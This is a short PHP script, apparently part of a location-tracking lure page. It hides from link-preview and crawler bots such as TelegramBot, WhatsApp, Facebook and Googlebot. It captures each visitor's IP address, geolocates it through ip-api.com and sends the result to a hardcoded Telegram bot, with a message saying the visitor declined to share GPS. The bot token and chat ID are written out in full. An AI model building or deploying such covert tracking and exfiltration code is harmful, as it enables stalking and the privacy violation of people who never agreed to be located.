<?php
// --- SMART BOT FILTER ---
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'TelegramBot') !== false || 
    strpos($userAgent, 'WhatsApp') !== false || 
    strpos($userAgent, 'Instagram') !== false || 
    strpos($userAgent, 'facebookexternalhit') !== false || 
    strpos($userAgent, 'Facebot') !== false || 
    strpos($userAgent, 'GoogleImageProxy') !== false || 
    strpos($userAgent, 'Googlebot') !== false) {
    exit();
}

// CONFIGURATION
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";

// Receive Error Data from JavaScript
$status = $_POST['Status'] ?? 'failed';
$error_msg = $_POST['Error'] ?? 'Unknown Error';

// Get IP Intelligence
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$city = $details->city ?? "Unknown";
$country = $details->country ?? "Unknown";

// Format the Telegram Alert
$message = "<b>⚠️ LOCATION DENIED / FAILED</b>\n\n";
$message .= "<b>🚫 Error:</b> <code>" . $error_msg . "</code>\n";
$message .= "<b>🌐 IP:</b> <code>" . $ip . "</code>\n";
$message .= "<b>📍 Last Known Area:</b> " . $city . ", " . $country . "\n\n";
$message .= "<i>The user saw the prompt but did not share GPS.</i>";

// Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

?>
